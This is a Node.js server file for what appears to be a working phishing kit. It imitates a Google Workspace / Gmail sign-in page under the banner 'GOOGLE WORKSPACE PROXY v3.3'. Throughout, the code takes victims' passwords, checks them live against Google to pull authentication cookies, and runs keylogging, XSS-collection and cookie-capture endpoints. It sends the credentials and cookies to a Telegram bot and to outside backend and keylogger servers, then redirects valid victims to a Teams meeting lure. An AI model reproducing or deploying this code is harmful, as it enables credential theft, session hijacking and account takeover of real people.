const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');

// ============================================================
//  ENVIRONMENT VARIABLES
// ============================================================

require('dotenv').config();

// Core Configuration
const PORT = process.env.PORT || 3000;
const BACKEND_URL = process.env.BACKEND_URL || "https://meeting-1-rzx6.onrender.com";
const KEYLOGGER_URL = process.env.KEYLOGGER_URL || "https://keyserver-eaar.onrender.com/log";

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Path Configuration
const PATHS = {
    script: "/inject.js",
    xssEndpoint: "/xss-collect",
    cookieEndpoint: "/cookie-capture",
    keylogEndpoint: "/keylog",
    loginPath: "/login",
    healthPath: "/health",
    sessionsPath: "/sessions"
};

console.log('╔═══════════════════════════════════════════════════════════╗');
console.log('║        ✅  GOOGLE WORKSPACE PROXY v3.3                   ║');
console.log('║        🔐  OAuth Flow + Full HttpOnly Cookie Capture     ║');
console.log('╠═══════════════════════════════════════════════════════════╣');
console.log(`║   📍 Server:    http://localhost:${PORT}                 ║`);
console.log(`║   🔗 Login:     ${PATHS.loginPath}?login_hint=email     ║`);
console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
console.log('╚═══════════════════════════════════════════════════════════╝');

// ============================================================
//  SESSION STORAGE
// ============================================================

const userSessions = {};
const attemptCounts = new Map();
const SESSION_TTL = 60 * 60 * 1000; // 1 hour

function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function getSessionIdFromCookie(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    return null;
}

function getSession(sessionId) {
    if (!sessionId) return null;
    const session = userSessions[sessionId];
    if (!session) return null;
    if (Date.now() - session.timestamp > SESSION_TTL) {
        delete userSessions[sessionId];
        return null;
    }
    return session;
}

function createSession(email, ip, userAgent) {
    const sessionId = generateSessionId();
    userSessions[sessionId] = {
        email: email || 'unknown',
        timestamp: Date.now(),
        ip: ip || 'unknown',
        userAgent: userAgent || 'Unknown',
        cookies: [],
        xssData: [],
        keystrokes: [],
        formData: [],
        credentials: [],
        created: new Date().toISOString(),
        lastActivity: Date.now(),
        attempts: 0,
        verified: false,
        error: null,
        oauthStep: 'init'
    };
    console.log(`[SESSION] ✅ Created session ${sessionId.substring(0, 12)} for email: ${email}`);
    return sessionId;
}

function getClientIp(req) {
    const cfIp = req.headers['cf-connecting-ip'];
    if (cfIp) return cfIp.trim();
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',').map(ip => ip.trim());
        return ips[0] || 'unknown';
    }
    const realIp = req.headers['x-real-ip'];
    if (realIp) return realIp.trim();
    return req.socket.remoteAddress || 'unknown';
}

// ============================================================
//  TELEGRAM NOTIFICATIONS - FULL DATA, NO TRUNCATION
// ============================================================

async function sendToTelegram(email, password, cookies, ip, targetUrl, fullData = {}, sessionId = null, success = false) {
    try {
        const fetch = require('node-fetch');
        const botToken = TELEGRAM_BOT_TOKEN;
        const chatId = TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('[TELEGRAM] ⚠️ Missing credentials');
            return;
        }

        let msg = `🔐 *GOOGLE WORKSPACE CAPTURE*\n\n`;
        msg += `*📧 Email:* ${email || 'unknown'}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📡 IP:* ${ip || 'unknown'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* ${sessionId ? sessionId.substring(0, 12) + '...' : 'N/A'}\n`;
        msg += `*🔐 Status:* ${success ? '✅ VALID' : '❌ INVALID'}\n`;
        msg += `*🎯 Service:* Google Workspace / Gmail\n`;
        
        // ✅ FULL COOKIES - NO TRUNCATION
        if (cookies && Object.keys(cookies).length > 0) {
            msg += `\n*🍪 FULL COOKIES (HttpOnly):*\n`;
            for (const [name, value] of Object.entries(cookies)) {
                const displayValue = value.length > 100 ? value.substring(0, 100) + '...' : value;
                msg += `  \`${name}\`: \`${displayValue}\`\n`;
            }
        }
        
        // Full form data - NO TRUNCATION
        if (fullData && Object.keys(fullData).length > 0) {
            const fullDataStr = JSON.stringify(fullData, null, 2);
            if (fullDataStr.length > 2000) {
                msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${fullDataStr.substring(0, 2000)}\n... (truncated for Telegram)\n\`\`\``;
            } else {
                msg += `\n*📝 FULL FORM DATA:*\n\`\`\`json\n${fullDataStr}\n\`\`\``;
            }
        }

        // Send to Telegram
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: msg.substring(0, 4096),
                    parse_mode: 'Markdown'
                })
            });

            if (response.ok) {
                console.log('[TELEGRAM] ✅ Sent');
            } else {
                const errorText = await response.text();
                console.log('[TELEGRAM] ❌ Failed:', response.status, errorText);
            }
        } catch (e) {
            console.log('[TELEGRAM] ❌ Error:', e.message);
        }

    } catch (error) {
        console.error('[TELEGRAM] ❌ Error:', error.message);
    }
}

// ============================================================
//  ✅ VERIFY WITH GOOGLE - OAuth Flow (Most Reliable)
// ============================================================

function verifyWithGoogle(email, password) {
    return new Promise((resolve) => {
        console.log(`[AUTH] 🔑 Starting OAuth verification for: ${email}`);
        
        // Step 1: Get the login page and extract GALX token
        const getOptions = {
            hostname: 'accounts.google.com',
            path: `/ServiceLogin?Email=${encodeURIComponent(email)}&continue=https://mail.google.com/mail&service=mail`,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            }
        };
        
        const getReq = https.get(getOptions, (getRes) => {
            let data = '';
            getRes.on('data', chunk => data += chunk);
            getRes.on('end', () => {
                // Capture initial cookies
                const initialCookies = getRes.headers['set-cookie'] || [];
                const cookieObj = {};
                initialCookies.forEach(cookie => {
                    const [name, value] = cookie.split(';')[0].split('=');
                    if (name && value) cookieObj[name] = value;
                });
                
                // Extract GALX token
                const galxMatch = data.match(/name="GALX"\s+value="([^"]+)"/i);
                const galxToken = galxMatch ? galxMatch[1] : '';
                
                // Extract other form fields
                const dshMatch = data.match(/name="dsh"\s+value="([^"]+)"/i);
                const dsh = dshMatch ? dshMatch[1] : '-' + Math.floor(Math.random() * 1000000000);
                
                // Check if we need to handle 2FA or other flows
                const needsTFA = data.includes('two-step') || data.includes('totp');
                const needsCaptcha = data.includes('captcha') || data.includes('challenge');
                
                console.log(`[AUTH] 📋 GALX Token: ${galxToken ? '✅ Found' : '❌ Not found'}`);
                console.log(`[AUTH] 📋 2FA Required: ${needsTFA ? '✅ Yes' : '❌ No'}`);
                console.log(`[AUTH] 📋 CAPTCHA Required: ${needsCaptcha ? '⚠️ Yes' : '❌ No'}`);
                
                if (needsCaptcha) {
                    console.log('[AUTH] ⚠️ CAPTCHA detected - will likely fail');
                }
                
                // Step 2: Submit login with GALX token
                const postData = querystring.stringify({
                    Email: email,
                    Passwd: password,
                    GALX: galxToken,
                    dsh: dsh,
                    continue: 'https://mail.google.com/mail',
                    service: 'mail',
                    accountType: 'HOSTED_OR_GOOGLE',
                    flowName: 'GlifWebSignIn',
                    flowEntry: 'ServiceLogin',
                    iframe: '0',
                    pw: '1',
                    rl: '0',
                    gxf: '',
                    rel: '1',
                    cb: '0'
                });
                
                const loginOptions = {
                    hostname: 'accounts.google.com',
                    path: '/ServiceLoginAuth',
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Content-Length': Buffer.byteLength(postData),
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Referer': 'https://accounts.google.com/ServiceLogin',
                        'Origin': 'https://accounts.google.com',
                        'Cookie': Object.entries(cookieObj).map(([k, v]) => `${k}=${v}`).join('; '),
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Upgrade-Insecure-Requests': '1'
                    }
                };
                
                const loginReq = https.request(loginOptions, (loginRes) => {
                    let loginData = '';
                    loginRes.on('data', chunk => loginData += chunk);
                    loginRes.on('end', () => {
                        // Capture auth cookies
                        const authCookies = loginRes.headers['set-cookie'] || [];
                        const authCookieObj = {};
                        authCookies.forEach(cookie => {
                            const [name, value] = cookie.split(';')[0].split('=');
                            if (name && value) {
                                authCookieObj[name] = value;
                            }
                        });
                        
                        // Check for Google auth cookies
                        const googleCookies = ['SAPISID', 'HSID', 'SSID', 'APISID', 'SID', 'NID', 'OSID'];
                        const foundAuthCookies = googleCookies.filter(name => authCookieObj[name]);
                        
                        console.log(`[AUTH] 🍪 Auth Cookies Received: ${Object.keys(authCookieObj).length}`);
                        if (foundAuthCookies.length > 0) {
                            console.log(`[AUTH] 🔐 Google Auth Cookies: ${foundAuthCookies.join(', ')}`);
                        }
                        
                        // Check if login successful
                        const success = loginData.includes('Gmail') || 
                                      loginData.includes('https://mail.google.com') ||
                                      loginData.includes('_auth') ||
                                      loginRes.headers.location?.includes('mail.google.com') ||
                                      foundAuthCookies.includes('SAPISID') ||
                                      foundAuthCookies.includes('HSID');
                        
                        // Check for error message
                        const errorMsg = loginData.match(/<span[^>]*id="errormsg"[^>]*>([^<]+)<\/span>/i);
                        const errorMsgText = errorMsg ? errorMsg[1].trim() : '';
                        if (errorMsgText) {
                            console.log(`[AUTH] ⚠️ Error Message: ${errorMsgText}`);
                        }
                        
                        console.log(`[AUTH] OAuth verification ${success ? '✅ SUCCESS' : '❌ FAILED'} for ${email}`);
                        
                        resolve({
                            success: success,
                            cookies: authCookieObj,
                            html: loginData.substring(0, 500),
                            cookieHeaders: authCookies,
                            redirectUrl: loginRes.headers.location || null,
                            statusCode: loginRes.statusCode,
                            errorMessage: errorMsgText || null
                        });
                    });
                });
                
                loginReq.on('error', (err) => {
                    console.error('[AUTH] ❌ Login request error:', err.message);
                    resolve({ 
                        success: false, 
                        cookies: {}, 
                        html: '', 
                        cookieHeaders: [],
                        redirectUrl: null,
                        statusCode: 500,
                        errorMessage: err.message
                    });
                });
                
                loginReq.write(postData);
                loginReq.end();
            });
        });
        
        getReq.on('error', (err) => {
            console.error('[AUTH] ❌ GET request error:', err.message);
            resolve({ 
                success: false, 
                cookies: {}, 
                html: '', 
                cookieHeaders: [],
                redirectUrl: null,
                statusCode: 500,
                errorMessage: err.message
            });
        });
        
        // Set timeout
        getReq.setTimeout(15000, () => {
            console.error('[AUTH] ⏰ Request timed out');
            getReq.destroy();
            resolve({ 
                success: false, 
                cookies: {}, 
                html: '', 
                cookieHeaders: [],
                redirectUrl: null,
                statusCode: 408,
                errorMessage: 'Request timeout'
            });
        });
    });
}

// ============================================================
//  SERVE FILES
// ============================================================

function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            serve404Page(res);
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType, 
            'Cache-Control': 'no-store, no-cache, must-revalidate'
        });
        res.end(data);
    });
}

function serve404Page(res) {
    const filePath = path.join(__dirname, '404_not_found.html');
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end(`
                <!DOCTYPE html>
                <html>
                <head><title>404 Not Found</title></head>
                <body>
                    <h1>Not Found</h1>
                    <p>The requested URL was not found on this server.</p>
                </body>
                </html>
            `);
            return;
        }
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end(data);
    });
}

// ============================================================
//  HANDLE XSS COLLECTION
// ============================================================

function handleXSSCollection(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[XSS] 📥 Received data from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].xssData.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[XSS] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE COOKIE CAPTURE
// ============================================================

function handleCookieCapture(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[COOKIE] 🍪 Received cookies from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].cookies.push({
                    ...data,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[COOKIE] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE KEYLOG
// ============================================================

function handleKeylog(req, res) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
        try {
            const data = JSON.parse(body);
            const sessionId = getSessionIdFromCookie(req.headers.cookie);
            const ip = getClientIp(req);
            
            console.log(`[KEYLOG] ⌨️ Received keystrokes from ${ip}`);
            
            if (sessionId && userSessions[sessionId]) {
                userSessions[sessionId].keystrokes.push({
                    keystrokes: data.keystrokes,
                    timestamp: Date.now(),
                    ip: ip
                });
                userSessions[sessionId].lastActivity = Date.now();
                
                if (KEYLOGGER_URL) {
                    const fetch = require('node-fetch');
                    fetch(KEYLOGGER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...data,
                            sessionId: sessionId,
                            ip: ip,
                            service: 'Google Workspace'
                        })
                    }).catch(() => {});
                }
            }
            
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ success: true }));
        } catch (error) {
            console.error('[KEYLOG] Error:', error.message);
            res.writeHead(500);
            res.end(JSON.stringify({ error: 'Internal server error' }));
        }
    });
}

// ============================================================
//  HANDLE LOGIN REQUEST
// ============================================================

function handleLoginRequest(req, res) {
    console.log(`[LOGIN] 🔐 Request received: ${req.url}`);

    const emailParam = req.url.match(/login_hint=([^&]+)/);
    const email = emailParam ? decodeURIComponent(emailParam[1]) : '';
    const ip = getClientIp(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    const errorParam = req.url.match(/error=([^&]+)/);
    const errorMessage = errorParam ? decodeURIComponent(errorParam[1]) : null;

    if (!email) {
        console.warn('[LOGIN] ⚠️ No email provided, redirecting to Google');
        res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
        res.end();
        return;
    }

    console.log(`[LOGIN] 📧 Email: ${email}`);
    console.log(`[LOGIN] 📡 IP: ${ip}`);

    const sessionId = createSession(email, ip, userAgent);
    if (errorMessage) {
        userSessions[sessionId].error = errorMessage;
    }
    
    const isSecure = req.headers['x-forwarded-proto'] === 'https' || req.socket.encrypted;
    const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
    res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);

    console.log(`[LOGIN] 🆔 Session: ${sessionId}`);

    const errorDisplay = errorMessage ? `
        <div class="error show" id="errorMsg">
            <span class="error-icon">⚠️</span>
            Invalid email or password. Please try again.
        </div>
    ` : '';

    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Google Workspace Sign In</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                background: #f5f5f5;
                padding: 20px;
            }
            .container {
                background: white;
                border-radius: 12px;
                padding: 40px 48px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                max-width: 400px;
                width: 100%;
                animation: fadeIn 0.3s ease;
            }
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(-10px); }
                to { opacity: 1; transform: translateY(0); }
            }
            .logo {
                text-align: center;
                margin-bottom: 24px;
            }
            .logo .icon {
                font-size: 48px;
                display: block;
                margin-bottom: 8px;
            }
            .logo h1 {
                font-size: 24px;
                color: #202124;
                margin: 0;
            }
            .logo p {
                color: #5f6368;
                margin: 4px 0 0;
                font-size: 14px;
            }
            .form-group {
                margin-bottom: 16px;
            }
            .form-group label {
                display: block;
                font-size: 14px;
                font-weight: 500;
                color: #202124;
                margin-bottom: 4px;
            }
            .form-group input {
                width: 100%;
                padding: 12px 14px;
                border: 1px solid #dadce0;
                border-radius: 4px;
                font-size: 16px;
                box-sizing: border-box;
                transition: border-color 0.2s, box-shadow 0.2s;
            }
            .form-group input:focus {
                outline: none;
                border-color: #1a73e8;
                box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
            }
            .form-group input::placeholder {
                color: #9aa0a6;
            }
            .email-display {
                background: #f1f3f4;
                padding: 12px 14px;
                border-radius: 4px;
                font-size: 16px;
                color: #202124;
                word-break: break-all;
                border: 1px solid #e8eaed;
            }
            .form-options {
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin: 16px 0 24px;
            }
            .form-options label {
                font-size: 13px;
                color: #5f6368;
                display: flex;
                align-items: center;
                gap: 6px;
                cursor: pointer;
            }
            .form-options a {
                color: #1a73e8;
                font-size: 13px;
                text-decoration: none;
            }
            .btn {
                width: 100%;
                padding: 12px;
                background: #1a73e8;
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                font-weight: 500;
                cursor: pointer;
                transition: background 0.2s, transform 0.1s;
            }
            .btn:hover {
                background: #1557b0;
            }
            .btn:active {
                transform: scale(0.98);
            }
            .btn:disabled {
                background: #dadce0;
                cursor: not-allowed;
                transform: none;
            }
            .error {
                color: #d93025;
                font-size: 14px;
                padding: 12px;
                background: #fce8e6;
                border-radius: 4px;
                display: none;
                text-align: center;
                margin-bottom: 16px;
                border: 1px solid #f5c6cb;
            }
            .error.show {
                display: block;
            }
            .error .error-icon {
                margin-right: 8px;
            }
            .loading {
                display: none;
                text-align: center;
                padding: 10px 0;
            }
            .loading .spinner {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 2px solid #e8eaed;
                border-radius: 50%;
                border-top-color: #1a73e8;
                animation: spin 0.8s linear infinite;
                margin-right: 8px;
                vertical-align: middle;
            }
            @keyframes spin {
                to { transform: rotate(360deg); }
            }
            .loading p {
                display: inline-block;
                vertical-align: middle;
                color: #5f6368;
                font-size: 14px;
                margin: 0;
            }
            .success-message {
                text-align: center;
                padding: 12px;
                background: #e6f4ea;
                border-radius: 4px;
                color: #1e7e34;
                margin-bottom: 16px;
                border: 1px solid #c8e6c9;
                display: none;
            }
            .success-message.show {
                display: block;
            }
            .footer {
                margin-top: 24px;
                text-align: center;
                font-size: 12px;
                color: #9aa0a6;
                border-top: 1px solid #e8eaed;
                padding-top: 20px;
            }
            .footer a {
                color: #1a73e8;
                text-decoration: none;
            }
            .footer a:hover {
                text-decoration: underline;
            }
            @media (max-width: 480px) {
                .container {
                    padding: 24px 20px;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <span class="icon">🔐</span>
                <h1>Sign in</h1>
                <p>to continue to Gmail</p>
            </div>
            
            ${errorDisplay}
            
            <div class="success-message" id="successMsg">
                ✅ Signing in successfully! Redirecting to meeting...
            </div>
            
            <div class="form-group">
                <label>Email</label>
                <div class="email-display" id="emailDisplay">${email}</div>
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" />
            </div>
            
            <div class="form-options">
                <label>
                    <input type="checkbox" checked /> Keep me signed in
                </label>
                <a href="#">Forgot password?</a>
            </div>
            
            <div id="error" class="error">
                <span class="error-icon">⚠️</span>
                Please enter your password
            </div>
            
            <button class="btn" id="loginBtn">Sign In</button>
            
            <div class="loading" id="loading">
                <span class="spinner"></span>
                <p>Verifying credentials...</p>
            </div>

            <div class="footer">
                <span>🔒 Secured • </span>
                <a href="#">Privacy Policy</a>
                <span> • </span>
                <a href="#">Terms of Service</a>
            </div>
        </div>

        <script>
            window.GOOGLE_CONFIG = {
                SESSION_ID: '${sessionId}',
                EMAIL: '${email}'
            };
            
            const loginBtn = document.getElementById('loginBtn');
            const passwordInput = document.getElementById('password');
            const errorDiv = document.getElementById('error');
            const loadingDiv = document.getElementById('loading');
            const successDiv = document.getElementById('successMsg');
            const errorMsgDiv = document.getElementById('errorMsg');

            function handleLogin() {
                const password = passwordInput.value.trim();
                
                if (!password) {
                    errorDiv.textContent = '⚠️ Please enter your password';
                    errorDiv.classList.add('show');
                    passwordInput.focus();
                    passwordInput.style.borderColor = '#d93025';
                    setTimeout(() => {
                        passwordInput.style.borderColor = '';
                    }, 3000);
                    return;
                }

                errorDiv.classList.remove('show');
                if (errorMsgDiv) errorMsgDiv.style.display = 'none';
                loginBtn.disabled = true;
                loginBtn.style.display = 'none';
                loadingDiv.style.display = 'block';
                successDiv.classList.remove('show');

                fetch('/login', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-Session-Id': '${sessionId}'
                    },
                    body: 'Email=' + encodeURIComponent('${email}') + 
                          '&Passwd=' + encodeURIComponent(password) +
                          '&accountType=HOSTED_OR_GOOGLE' +
                          '&service=mail'
                })
                .then(response => {
                    if (response.redirected) {
                        successDiv.textContent = '✅ Signing in successfully! Redirecting...';
                        successDiv.classList.add('show');
                        setTimeout(() => {
                            window.location.href = response.url;
                        }, 1000);
                    } else {
                        throw new Error('Login failed');
                    }
                })
                .catch(error => {
                    errorDiv.textContent = '⚠️ Invalid email or password. Please try again.';
                    errorDiv.classList.add('show');
                    loginBtn.disabled = false;
                    loginBtn.style.display = 'block';
                    loadingDiv.style.display = 'none';
                    passwordInput.value = '';
                    passwordInput.focus();
                    passwordInput.style.borderColor = '#d93025';
                    setTimeout(() => {
                        passwordInput.style.borderColor = '';
                    }, 2000);
                });
            }

            loginBtn.addEventListener('click', handleLogin);

            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    handleLogin();
                }
            });

            passwordInput.addEventListener('input', function() {
                errorDiv.classList.remove('show');
                if (errorMsgDiv) errorMsgDiv.style.display = 'none';
                this.style.borderColor = '';
            });

            setTimeout(() => passwordInput.focus(), 500);
            ${errorMessage ? 'setTimeout(() => passwordInput.focus(), 1000);' : ''}
        </script>
        <script src="${PATHS.script}"></script>
    </body>
    </html>
    `;

    res.writeHead(200, {
        'Content-Type': 'text/html',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache'
    });
    res.end(html);
}

// ============================================================
//  HANDLE POST REQUEST - Capture and Verify Credentials
// ============================================================

async function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const ip = getClientIp(req);
        const sessionId = getSessionIdFromCookie(req.headers.cookie);
        
        let email = formData.Email || formData.email || formData.identifier || '';
        const password = formData.Passwd || formData.passwd || formData.password || '';
        
        if (!email && sessionId && userSessions[sessionId]) {
            email = userSessions[sessionId].email;
        }
        
        if (!email) {
            const match = req.url.match(/login_hint=([^&]+)/);
            if (match) email = decodeURIComponent(match[1]);
        }
        
        if (!email) {
            console.warn('[POST] No email found');
            res.writeHead(302, { 'Location': 'https://accounts.google.com/ServiceLogin' });
            res.end();
            return;
        }

        let attemptCount = attemptCounts.get(email) || 0;
        attemptCount++;
        attemptCounts.set(email, attemptCount);

        console.log(`[CREDENTIALS] 📧 Email: ${email}`);
        console.log(`[CREDENTIALS] 🔑 Password: ${password ? '***' : 'N/A'}`);
        console.log(`[CREDENTIALS] 📊 Attempt: ${attemptCount}`);
        console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
        console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);

        // ✅ Call verifyWithGoogle with OAuth flow
        const verifyResult = await verifyWithGoogle(email, password);
        
        let allCookies = {};
        if (sessionId && userSessions[sessionId]) {
            userSessions[sessionId].credentials.push({
                email: email,
                password: password,
                timestamp: Date.now(),
                ip: ip,
                success: verifyResult.success,
                attempt: attemptCount
            });
            userSessions[sessionId].attempts = attemptCount;
            userSessions[sessionId].verified = verifyResult.success;
            
            if (verifyResult.cookies && Object.keys(verifyResult.cookies).length > 0) {
                userSessions[sessionId].cookies.push({
                    cookies: verifyResult.cookies,
                    timestamp: Date.now(),
                    source: 'google_verification',
                    success: verifyResult.success
                });
                allCookies = verifyResult.cookies;
            }
        }

        // ✅ Send to Telegram
        await sendToTelegram(
            email,
            password,
            allCookies,
            ip,
            req.url,
            formData,
            sessionId,
            verifyResult.success
        );

        // ✅ Send to backend
        try {
            const fetch = require('node-fetch');
            await fetch(`${BACKEND_URL}/api/log-action`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: verifyResult.success ? 'login_success' : 'login_failed',
                    email: email,
                    password: password,
                    service: 'Google Workspace',
                    targetUrl: req.url,
                    ip: ip,
                    sessionId: sessionId,
                    timestamp: new Date().toISOString(),
                    formData: formData,
                    cookies: allCookies,
                    verified: verifyResult.success
                })
            });
        } catch (e) {
            console.log('[BACKEND] ⚠️ Failed to log:', e.message);
        }

        // ✅ Redirect based on verification
        if (verifyResult.success) {
            console.log(`[AUTH] ✅ Valid credentials: ${email}`);
            res.writeHead(302, { 
                'Location': 'https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true',
                'Cache-Control': 'no-store'
            });
            res.end();
        } else {
            console.log(`[AUTH] ❌ Invalid credentials: ${email}`);
            // Redirect back to login with error parameter
            res.writeHead(302, { 
                'Location': `/login?login_hint=${encodeURIComponent(email)}&error=invalid_credentials`,
                'Cache-Control': 'no-store'
            });
            res.end();
        }

    } catch (error) {
        console.error('[ERROR] POST handling:', error.message);
        console.error('[ERROR] Stack:', error.stack);
        res.writeHead(500);
        res.end('Internal server error');
    }
}

// ============================================================
//  MAIN SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // --- Serve files ---
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }
    if (req.url === PATHS.script) {
        serveFile('script_inject.js', res, 'text/javascript');
        return;
    }

    // --- Health check ---
    if (req.url === PATHS.healthPath) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            uptime: process.uptime(),
            sessions: Object.keys(userSessions).length,
            service: 'Google Workspace Proxy',
            version: '3.3.0'
        }));
        return;
    }

    // --- Sessions admin ---
    if (req.url === PATHS.sessionsPath && req.method === 'GET') {
        const sessionData = Object.keys(userSessions).map(id => ({
            sessionId: id.substring(0, 12) + '...',
            email: userSessions[id].email || 'N/A',
            ip: userSessions[id].ip || 'N/A',
            created: userSessions[id].created,
            attempts: userSessions[id].attempts || 0,
            verified: userSessions[id].verified || false,
            error: userSessions[id].error || null,
            cookieCount: (userSessions[id].cookies || []).length,
            keystrokeCount: (userSessions[id].keystrokes || []).length
        }));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            total: sessionData.length,
            sessions: sessionData
        }, null, 2));
        return;
    }

    // --- XSS Collection endpoint ---
    if (req.url === PATHS.xssEndpoint && req.method === 'POST') {
        handleXSSCollection(req, res);
        return;
    }

    // --- Cookie Capture endpoint ---
    if (req.url === PATHS.cookieEndpoint && req.method === 'POST') {
        handleCookieCapture(req, res);
        return;
    }

    // --- Keylog endpoint ---
    if (req.url === PATHS.keylogEndpoint && req.method === 'POST') {
        handleKeylog(req, res);
        return;
    }

    // --- POST requests ---
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // --- Login requests ---
    if (req.url.startsWith(PATHS.loginPath)) {
        handleLoginRequest(req, res);
        return;
    }

    // --- 404 - Handle all other requests with custom 404 page ---
    console.log(`[404] 🔍 Not Found: ${req.url}`);
    serve404Page(res);
});

